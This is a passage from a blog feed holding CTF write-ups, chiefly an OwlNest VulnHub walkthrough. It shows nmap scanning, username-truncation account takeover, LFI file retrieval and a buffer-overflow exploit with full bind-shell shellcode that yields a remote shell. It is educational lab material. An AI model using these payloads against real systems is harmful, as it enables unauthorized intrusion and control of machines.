</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
</span><span class='line'><span class="c"># cd /root</span>
</span><span class='line'><span class="c"># ls -l</span>
</span><span class='line'>total 16
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">1459</span> Oct <span class="m">11</span> 18:04 crpt.py
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root <span class="m">1027</span> Oct <span class="m">10</span> 18:19 server.py
</span><span class='line'>-rwxr-xr-x <span class="m">1</span> root root  <span class="m">119</span> Sep <span class="m">26</span> 12:10 start.sh
</span><span class='line'>drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Oct <span class="m">10</span> 20:55 the_flag_is_in_here
</span><span class='line'><span class="c"># cd the_flag_is_in_here</span>
</span><span class='line'>ls -l
</span><span class='line'><span class="c"># total 4</span>
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root root <span class="m">895</span> Oct <span class="m">10</span> 20:55 qQcmDWKM5a6a3wyT.txt
</span><span class='line'><span class="c"># cat qQcmDWKM5a6a3wyT.txt</span>
</span><span class='line'> __                         __              __                         __      ____
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __         <span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ /_   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  ______ <span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;  /_____/ <span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span>        <span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="p">|</span>___<span class="p">|</span>
</span><span class='line'>     <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>              <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>Hooray you got the flag!
</span><span class='line'>
</span><span class='line'>Hope you had as much fun r00ting this as I did making it!
</span><span class='line'>
</span><span class='line'>Feel free to hit me up in <span class="c">#vulnhub @ zer0w1re</span>
</span><span class='line'>
</span><span class='line'>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
</span><span class='line'>as well as rasta_mouse, and recrudesce <span class="k">for</span> helping to find bugs and <span class="nb">test </span>the VM :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>root password is <span class="s2">&quot;qVx4UJ*zcUdc9#3C$Q&quot;</span>, but you should already have a shell, right? <span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://halloffamejay.com/wp-content/uploads/2013/10/muppet.gif" alt="" /></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Owl Up In My Grill]]></title>
    <link href="http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill/"/>
    <updated>2014-10-26T17:16:50+00:00</updated>
    <id>http://recrudesce.github.io/2014/10/26/owl-up-in-my-grill</id>
    <content type="html"><![CDATA[<p>So, while we were all sitting in #vulnhub (on Freenode) waiting for<a href="https://twitter.com/superkojiman">superkojiman</a> to release Persistence, <a href="https://twitter.com/swappage">Swappage</a> released <a href="vulnhub.com/entry/owlnest-102,102/">OwlNest</a>. I thought, what the hell, might as well use it to pass the time, right ? I was, however, not expecting it to take me 4 days&hellip;</p>

<!-- more -->


<h2>Were You Born in a Barn (Owl) ?</h2>

<p>A quick dig around using NMAP</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:/var/www# nmap -sS -O -p1-65535 --script banner 172.16.56.131 -P0
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.47 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-01 22:49 BST
</span><span class='line'>Nmap scan report <span class="k">for</span> 172.16.56.131
</span><span class='line'>Host is up <span class="o">(</span>0.00034s latency<span class="o">)</span>.
</span><span class='line'>Not shown: <span class="m">65530</span> closed ports
</span><span class='line'>PORT      STATE SERVICE
</span><span class='line'>22/tcp    open  ssh
</span><span class='line'><span class="p">|</span>_banner: SSH-2.0-OpenSSH_6.0p1 Debian-4+deb7u2
</span><span class='line'>80/tcp    open  http
</span><span class='line'>111/tcp   open  rpcbind
</span><span class='line'>31337/tcp open  Elite
</span><span class='line'><span class="p">|</span> banner: <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span><span class="se">\x</span>0D<span class="se">\x</span>
</span><span class='line'><span class="p">|</span>_0A        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\\</span>...
</span><span class='line'>34895/tcp open  unknown
</span><span class='line'>MAC Address: 00:0C:29:9A:51:B8 <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>Device <span class="nb">type</span>: general purpose
</span><span class='line'>Running: Linux 3.X
</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:3
</span><span class='line'>OS details: Linux 3.2 - 3.10
</span><span class='line'>Network Distance: <span class="m">1</span> hop
</span><span class='line'>
</span><span class='line'>OS detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 8.87 seconds
</span><span class='line'>root@pwk:/var/www#
</span></code></pre></td></tr></table></div></figure>


<p>Looks like there&rsquo;s a banner on port 31337, might as well get all of it, and see if the service behind it is vulnerable to format string.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:/var/www# nc -nv 172.16.56.131 31337
</span><span class='line'>nc: 172.16.56.131 <span class="m">31337</span> open
</span><span class='line'>        <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>   <span class="o">(</span><span class="se">\_</span>__/<span class="o">)</span>
</span><span class='line'>        /0<span class="se">\ </span>/0<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\ </span>  /O<span class="se">\ </span>/O<span class="se">\ </span>  /o<span class="se">\ </span>/o<span class="se">\ </span>  /0<span class="se">\ </span>/0<span class="se">\</span>
</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'>       /<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|;</span>, ,<span class="p">;|</span><span class="se">\ </span>/<span class="p">|</span>:. .:<span class="p">|</span><span class="se">\</span>
</span><span class='line'>       <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>:::::// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span><span class="p">;;;;;</span>// <span class="se">\\</span>::::://
</span><span class='line'>   -----<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---<span class="sb">`</span><span class="s2">&quot;&quot;</span> <span class="s2">&quot;&quot;</span><span class="sb">`</span>---
</span><span class='line'>        <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/   <span class="se">\_</span>_V__/
</span><span class='line'>
</span><span class='line'>This is the OwlNest Administration console
</span><span class='line'>
</span><span class='line'>Type Help <span class="k">for</span> a list of available commands.
</span><span class='line'>
</span><span class='line'>Ready: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%Ss
</span><span class='line'>Ready: <span class="nb">help</span>
</span><span class='line'>
</span><span class='line'>Syntax: <span class="nb">command</span> &lt;argument&gt;
</span><span class='line'>
</span><span class='line'><span class="nb">help      </span>This <span class="nb">help</span>
</span><span class='line'>username   Specify your login name
</span><span class='line'>password   Specify your password
</span><span class='line'>privs  Specify your access level
</span><span class='line'>login      login to shell with specified username and password
</span><span class='line'>
</span><span class='line'>Ready:
</span></code></pre></td></tr></table></div></figure>


<p>This looks like something we&rsquo;ll need a username and password for. As none are known, this port is being ignored for now. Port 80&rsquo;s where it&rsquo;s at then.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_001.png" alt="owlnest_001" /></a></p>

<p>The Register link allows us to create a new user, which we can use to log in and look around</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_002.png" alt="owlnest_002" /></a></p>

<p>But it seems we&rsquo;re not allowed to use the Upload feature, because we&rsquo;re not &ldquo;admin&rdquo;. An interesting point to note here is that the URL for the Upload feature is <a href="http://172.16.56.131/uploadform.php?page=forms/form.php,">http://172.16.56.131/uploadform.php?page=forms/form.php,</a> which means we could possibly leverage it for LFI. No other links on the site work in this way.</p>

<p>Looking at the source for the registration page, it seems the username is capped at 16 characters.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;form-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>              <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">&quot;nome&quot;</span> <span class="na">class=</span><span class="s">&quot;col-sm-2 col-lg-2 control-label&quot;</span><span class="nt">&gt;</span>Login Name:<span class="nt">&lt;/label&gt;</span>
</span><span class='line'>              <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;col-sm-5 col-lg-5&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>                  <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">class=</span><span class="s">&quot;form-control&quot;</span> <span class="na">maxlength=</span><span class="s">&quot;16&quot;</span> <span class="na">name=</span><span class="s">&quot;username&quot;</span> <span class="na">id=</span><span class="s">&quot;username&quot;</span> <span class="na">placeholder=</span><span class="s">&quot;Choose a Login name...&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>              <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>          <span class="nt">&lt;/div&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Could we cheat the system and register a user with the name &ldquo;admin&rdquo; and then add 11 spaces after it plus a random character ? We can assume that the registration form will truncate any characters over 16. Tamper data is our friend here - the form can be filled in with the username of &ldquo;admin&rdquo; and then intercepted with Tamper data (or Burp, if you want) to modify the username POST variable to &ldquo;admin           a&rdquo; and submitted.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_003.png" alt="owlnest_003" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_004.png" alt="owlnest_004" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_005.png" alt="owlnest_005" /></a></p>

<p>Once this malicious user is created, it is possible to then log in with the username of &ldquo;admin&rdquo; and the password we set for &ldquo;admin           a&rdquo;.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_006.png" alt="owlnest_006" /></a></p>

<p>Which allows access to the Upload feature (not that we&rsquo;re going to use it for it&rsquo;s intended use)</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_007.png" alt="owlnest_007" /></a></p>

<hr />

<h2>This is a Hoot !</h2>

<p>The upload form posts to /application/upload</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">class=</span><span class="s">&quot;form-horizontal&quot;</span> <span class="na">method=</span><span class="s">&quot;POST&quot;</span> <span class="na">enctype=</span><span class="s">&quot;multipart/form-data&quot;</span> <span class="na">action=</span><span class="s">&quot;/application/upload&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Which when called with no arguments shows the following</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_008.png" alt="owlnest_008" /></a></p>

<p>It is possible to browse to the application folder, which shows that the application is actually 601kb - a bit much just to parse an upload form.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/09/owlnest_009.png" alt="owlnest_009" /></a></p>

<h2>Owls Well That Ends Well</h2>

<p>The uploadform.php page can be used to provide us with a base64 encoded copy of the upload binary, which means it will not be parsed or executed.</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/10/owlnest_010.png" alt="owlnest_010" /></a></p>

<p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">export </span><span class="nv">QUERY_STRING</span><span class="o">=</span><span class="s2">&quot;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=me@me.com&quot;</span>
</span><span class='line'>root@pwk:~# ./owlbin
</span><span class='line'>Content-type: text/plain
</span><span class='line'>
</span><span class='line'>Unable to open file
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>It is possible to overflow this application via the email variable, which through some further investigation identifies that EIP is at offset 277.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">export </span><span class="nv">QUERY_STRING</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;uploadfield=/etc/passwd&amp;uploadfield=bleh99&amp;name=Me&amp;email=AAH@&quot; + &quot;A&quot;*276+&quot;BBBB&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>root@pwk:~# ./owlbin
</span><span class='line'>Content-type: text/plain
</span><span class='line'>
</span><span class='line'>Segmentation fault
</span><span class='line'>root@pwk:~#
</span></code></pre></td></tr></table></div></figure>


<p>gdb-peda can be used to find a jmp esp call, which is at 0x80c75ab9. This is what we&rsquo;ll set our EIP value to, which should hopefully jump to our bind shell shellcode. This can be completely exploited as follows</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# <span class="nb">export </span><span class="nv">QUERY_STRING</span><span class="o">=</span><span class="k">$(</span>python -c <span class="s1">&#39;print &quot;uploadfield=/etc/passwd&amp;uploadfield=passwd&amp;name=Russ&amp;email=AAH@&quot; + &quot;A&quot;*276+&quot;\xab\x75\x0c\x08&quot; + &quot;\x90\x90\x90\x90\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80&quot;&#39;</span><span class="k">)</span>
</span><span class='line'>root@pwk:~# curl -v <span class="s2">&quot;http://172.16.56.140/application/upload&quot;</span> --data <span class="s2">&quot;$QUERY_STRING&quot;</span>
</span><span class='line'>* About to connect<span class="o">()</span> to 172.16.56.140 port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>*   Trying 172.16.56.140...
</span><span class='line'>* connected
</span><span class='line'>* Connected to 172.16.56.140 <span class="o">(</span>172.16.56.140<span class="o">)</span> port <span class="m">80</span> <span class="o">(</span><span class="c">#0)</span>
</span><span class='line'>&gt; POST /application/upload HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: 172.16.56.140
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Content-Length: 436
</span><span class='line'>&gt; Content-Type: application/x-www-form-urlencoded
</span><span class='line'>&gt;
</span><span class='line'>* upload completely sent off: <span class="m">436</span> out of <span class="m">436</span> bytes
</span><span class='line'>root@pwk:~# nc -nv 172.16.56.140 1337
</span><span class='line'>nc: 172.16.56.140 <span class="m">1337</span> open
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>ssh rmp@172.16.56.131
</span><span class='line'>The authenticity of host <span class="s1">&#39;172.16.56.131 (172.16.56.131)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>172.16.56.131<span class="err">&#39;</span> <span class="o">(</span>RSA<span class="o">)</span> to the list of known hosts.
</span><span class='line'>Linux owlnest 3.2.0-4-686-pae <span class="c">#1 SMP Debian 3.2.60-1+deb7u3 i686</span>
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span><span class='line'>the exact distribution terms <span class="k">for</span> each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>You have new mail.
</span><span class='line'>rmp@owlnest:~<span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>rmp<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>
</span><span class='line'>rmp@owlnest:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>There&rsquo;s one application available in /home/rmp, and that&rsquo;s the application that is listening on port 31337 (the one that requested username and password etc).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>rmp@owlnest:~<span class="nv">$ </span>ls -l
</span><span class='line'>total 588
</span><span class='line'>-rwx------ <span class="m">1</span> rmp rmp <span class="m">599275</span> Aug <span class="m">11</span> 13:35 adminconsole
</span><span class='line'>rmp@owlnest:~<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>which when straced, shows that it is reading /root/password.txt to check the provided credentials.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@pwk:~# strace ./adminconsole
</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./adminconsole&quot;</span>, <span class="o">[</span><span class="s2">&quot;./adminconsole&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">19</span> vars */<span class="o">])</span> <span class="o">=</span> 0
</span><span class='line'>uname<span class="o">({</span><span class="nv">sys</span><span class="o">=</span><span class="s2">&quot;Linux&quot;</span>, <span class="nv">node</span><span class="o">=</span><span class="s2">&quot;pwk&quot;</span>, ...<span class="o">})</span>   <span class="o">=</span> 0
</span><span class='line'>brk<span class="o">(</span>0<span class="o">)</span>                                  <span class="o">=</span> 0x9407000
</span><span class='line'>brk<span class="o">(</span>0x9407cd0<span class="o">)</span>                          <span class="o">=</span> 0x9407cd0
